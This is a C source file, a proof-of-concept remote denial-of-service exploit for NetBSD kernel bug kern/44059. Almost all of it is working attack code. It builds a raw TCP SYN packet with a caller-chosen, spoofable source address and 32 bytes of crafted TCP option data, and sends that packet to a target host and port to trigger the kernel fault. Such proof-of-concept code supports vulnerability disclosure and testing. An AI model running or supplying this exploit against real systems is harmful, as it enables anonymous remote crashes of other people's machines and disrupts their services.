/* $Id$
 * NetBSD kern/44059[1] remote DoS PoC, tested on NetBSD/i386 5.0.1-RELEASE
 * kern44059.c (c) 2010, 2017 by Lucía Andrea Illanes Albornoz * <lucia@luciaillanes.de>
 *
 * Relevant references:
 *	[1] kern/44059: [ ... ] -- <http://mail-index.netbsd.org/netbsd-bugs/2010/11/07/msg019731.html>
 *	[2] RFC 791 -- Internet Protocol
 *	[3] RFC 793 -- Transmission Control Protocol
 *	[4] RFC 1071 -- Computing the Internet Checksum
 *	[5] sys/netinet/raw_ip.c v1.108 @361:rip_output()
 *	[6] <http://lists.freebsd.org/pipermail/freebsd-pf/2008-March/004223.html>
 *	[7] <http://www.webservertalk.com/archive249-2006-1-1345442.html>
 *	[8] TCP Option Kind Numbers -- <http://www.iana.org/assignments/tcp-parameters/tcp-parameters.xml>
 *	[9] <http://marc.info/?l=openbsd-pf&m=113844738811816>
 *	[10] <http://permalink.gmane.org/gmane.os.openbsd.tech/9889>
 *	[11] <http://marc.info/?t=113396771300009&r=1&w=2>
 */

/* {{{ Header includes */
#include <stdio.h>		/* vprintf, printf */
#include <stdlib.h>		/* malloc, srandom, EXIT_FAILURE, atoi, random, EXIT_SUCCESS */
#include <stdarg.h>		/* va_list, va_start, va_end */
#include <string.h>		/* memcpy */
#include <strings.h>		/* bzero */
#include <ctype.h>		/* isprint */
#include <unistd.h>		/* getpid */
#include <time.h>		/* time */

#include <sys/types.h>		/* u_char, ushort, ulong, size_t */
#include <sys/socket.h>		/* send, PF_INET, socket, SOCK_RAW, setsockopt, IPPROTO_IP, IP_HDRINCL, connect*/
#include <arpa/inet.h>		/* ntohs, htons, inet_addr */
#include <netinet/in.h>		/* struct in_addr, IPPROTO_TCP, in_addr_t, struct sockaddr_in, INADDR_NONE */
#include <netinet/in_systm.h>
#include <netinet/ip.h>		/* struct ip */
#include <netinet/tcp.h>	/* struct tcphdr */

#include <err.h>		/* errx, err */
/* }}} */
/* {{{ Type definitions, data structures, and macros */
/* Machine dependent explicit-width primitive type definitions */
typedef u_char	u8_t;
typedef ushort	u16_t;
typedef ulong	u32_t;

/* Pseudo-TCP header data structure for use with TCP checksumming
 * [cf. <http://www.enderunix.org/docs/en/rawipspoof/>] */
struct psd_tcp {
	struct in_addr pt_src, pt_dst; u8_t pt_pad, pt_p; u16_t pt_len;
};

/* Default struct {ip, tcphdr} aggregate initializers */
#define DFLT$IP_HDR(len) {						\
	.ip_v = 4, .ip_hl = 5, .ip_tos = 0,				\
	.ip_len = len, .ip_id = 0,					\
	.ip_off = 0, .ip_ttl = 255, .ip_p = IPPROTO_TCP,		\
	.ip_src.s_addr = 0, .ip_dst.s_addr = 0,				\
}

#define DFLT$TCP_HDR(off, flags) {					\
	.th_sport = 0, .th_dport = 0, .th_seq = 0,			\
	.th_ack = 0, .th_off = (off) >> 2, .th_x2 = 0,			\
	.th_flags = flags, .th_win = 65535, .th_sum = 0, .th_urp = 0,	\
}

/* IPv4 and TCP header length bytes macros */
#define IP$HLEN(ip)	(ip.ip_hl << 2)
#define TCP$HLEN(th)	(th.th_off << 2)

/* Parameter decorators additionally annotating byte order */
#define __in
#define __in_opt
#define __in_NB
#define __out
#define __inout
/* }}} */
/* {{{ Static prototypes and subr */
#ifdef DEBUG
static void dump(__in const void *buf, __in size_t buflen, __in_opt const char *hdr_line, __in_opt ...);
#endif /* DEBUG */

/* [cf.	$NetBSD: print-ip.c,v 1.7 2007/07/24 11:53:44 drochner Exp $,
 *	<http://www.enderunix.org/docs/en/rawipspoof/>] */
static u16_t in_cksum(__in const u16_t *buf, __in size_t buflen);
static u16_t ip_cksum(__in struct ip *ih);
static u16_t tcp_cksum(__in_NB in_addr_t ip_src, __in_NB in_addr_t ip_dst, __in struct tcphdr *th, __in size_t thlen);

static int send_ip(__in int s, __in struct sockaddr_in *sin_dst, __inout u8_t *packet);


#ifdef DEBUG
static
void
dump(
	__in		const void	*buf,
	__in		size_t		 buflen,
	__in_opt	const char	*hdr_line,
	__in_opt	...
)
{
	va_list ap;


	if(NULL != hdr_line) {
		va_start(ap, hdr_line);
		 vprintf(hdr_line, ap); printf("\n");
		va_end(ap);
	};

	for(int n = 0, m = 0; n < buflen; printf("\n"), n += 16) {
		for(printf("%08d    ", n), m = 0;
		(m < 16) && ((m + n) < buflen); ++m)
			printf("%02X ", ((int) ((u8_t *) buf)[m + n]) & 0xff);
		for(; m < 16; ++m) printf("   ");

		for(printf("    "), m = 0;
		(m < 16) && ((m + n) < buflen); ++m)
			printf(
				"%c",
				isprint((int) ((u8_t *) buf)[m + n])
				? ((u8_t *) buf)[m + n] : '.');
	};	printf("\n");
}
#endif /* DEBUG */


static
u16_t
in_cksum(
	__in	const u16_t	*buf,
	__in	size_t		 buflen
)
{
	int sum = 0;


	/*
	 *  Our algorithm is simple, using a 32 bit accumulator (sum),
	 *  we add sequential 16 bit words to it, and at the end, fold
	 *  back all the carry bits from the top 16 bits into the lower
	 *  16 bits.
	 */
	while(1 < buflen) sum += ntohs(*(buf++)), buflen -= 2;
	if(1 == buflen)
		sum += htons(*((u8_t *) buf) << 8);

	/*
	 * add back carry outs from top 16 bits to low 16 bits
	 */
	sum  = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
	sum += (sum >> 16);			/* add carry */

	return (u16_t) ~sum;			/* truncate to 16 bits */
}


static
u16_t
ip_cksum(
	__in	struct ip	*ih
)
{
	int sum = 0;


	ih->ip_len = htons(ih->ip_len); ih->ip_off = htons(ih->ip_off); /*[5]*/
	 sum = in_cksum((u16_t *) ih, IP$HLEN((*ih)));
	ih->ip_len = ntohs(ih->ip_len); ih->ip_off = ntohs(ih->ip_off); /*[5]*/

	return sum;
}


static
u16_t
tcp_cksum(
	__in_NB	in_addr_t	 ip_src,
	__in_NB	in_addr_t	 ip_dst,
	__in	struct tcphdr	*th,
	__in	size_t		 thlen
)
{
	static u8_t *buf = NULL; static size_t buflen = 0;
	struct psd_tcp *psd_tcp = NULL;


	if((buflen < (sizeof(*psd_tcp) + thlen))
	&& (NULL == (buf = malloc((buflen = (sizeof(*psd_tcp) + thlen))))))
		err(EXIT_FAILURE, "malloc");
	else	bzero(psd_tcp = ((struct psd_tcp *) buf), buflen);

	psd_tcp->pt_src.s_addr = ip_src; psd_tcp->pt_dst.s_addr = ip_dst;
	psd_tcp->pt_p = IPPROTO_TCP; psd_tcp->pt_len = htons(thlen);
	memcpy(buf + sizeof(*psd_tcp), th, thlen);

	return in_cksum((u16_t *) psd_tcp, sizeof(*psd_tcp) + thlen);
}


static
int
send_ip(
	__in	int			 s,
	__in	struct sockaddr_in	*sin_dst,
	__inout	u8_t			*packet
)
{
	struct ip *ih = (struct ip *) packet;
	struct tcphdr *th = (struct tcphdr *) ((u8_t *) ih + sizeof(*ih));
	in_addr_t ip_src = ih->ip_src.s_addr, ip_dst = ih->ip_dst.s_addr;


	/*
	 * N.B.	send{,to} (2) expects the /ip_{len, off}/ fields in host byte
	 *	byte order and transparently performs the necessary conversions
	 *	prior to putting the thereby resulting IP packet on-wire[5].
	 *	Do consider this when passing IP in to this here subr.
	 */

	ih->ip_sum = htons(ip_cksum(ih));
	th->th_sum = htons(tcp_cksum(ip_src, ip_dst, th, TCP$HLEN((*th))));

#ifdef DEBUG
	ih->ip_len = htons(ih->ip_len); ih->ip_off = htons(ih->ip_off);
	 dump(ih, ntohs(ih->ip_len), "send_ip: len=%d", ntohs(ih->ip_len));
	ih->ip_len = ntohs(ih->ip_len); ih->ip_off = ntohs(ih->ip_off);
#endif /* DEBUG */

	return send(s, packet, ih->ip_len, 0);
}
/* }}} */

int
main(
	__in	int	 argc,
	__in	char	*argv[]
)
{
#define TH$OPTSLEN	32
	int s = -1;

	u8_t packet[sizeof(struct ip) + sizeof(struct tcphdr) + TH$OPTSLEN];
	struct ip *ih = (struct ip *) &(packet[0]);
	struct tcphdr *th = (struct tcphdr *) ((u8_t *) ih + sizeof(*ih));

	struct sockaddr_in sin = {
		.sin_len = sizeof(sin), .sin_family = PF_INET,
		.sin_port = 0, .sin_addr = { 0, }, .sin_zero = { 0, },
	};


	srandom(time(NULL) + getpid());
	(*ih) = ((struct ip) DFLT$IP_HDR(sizeof(packet)));
	(*th) = ((struct tcphdr) DFLT$TCP_HDR(
				TH$OPTSLEN + sizeof(struct tcphdr), TH_SYN));

	if((1 + 3) != argc)
	usage:	 errx(EXIT_FAILURE, "usage: %s saddr daddr dport", argv[0]);
	else
	if((INADDR_NONE == (ih->ip_src.s_addr = inet_addr(argv[1])))
	|| (INADDR_NONE == (ih->ip_dst.s_addr = inet_addr(argv[2]))))
		err(EXIT_FAILURE, "inet_addr");
	else
	if(0 == (sin.sin_port = (th->th_dport = htons(atoi(argv[3])))))
		goto usage;
	else	sin.sin_addr.s_addr = ih->ip_dst.s_addr,
		th->th_sport = random();

	if(-1 == (s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)))
		err(EXIT_FAILURE, "socket(PF_INET, SOCK_RAW, IPPROTO_RAW)");
	else
	if(-1 == setsockopt(
			   s, IPPROTO_IP, IP_HDRINCL,
			&((int[]) { 1, }), sizeof(int[1])))
		err(EXIT_FAILURE, "setsockopt(IPPROTO_IP, IP_HDRINCL");
	else	th->th_seq = random(),
		memcpy(
			((u8_t *) th) + sizeof(*th),
			&((u8_t[TH$OPTSLEN]) {
			0x51, 0x9d, 0x45, 0x75, 0x76, 0xd9, 0x92, 0xa4,
			0x94, 0x1f, 0xb7, 0x37, 0xf6, 0x2a, 0xaa, 0x11,
			0x0b, 0xbe, 0x9f, 0xf6, 0x71, 0x02, 0xe8, 0xfe,
			0xd0, 0x6a, 0x15, 0xaa, 0xb4, 0x70, 0x5e, 0xf6,
			}), TH$OPTSLEN);

	if(-1 == send_ip(s, &(sin), packet))
		err(EXIT_FAILURE, "send_ip");
	else	return EXIT_SUCCESS;
}

/*
 * vim:ts=8 sw=8 tw=80 noexpandtab foldmethod=marker
 */
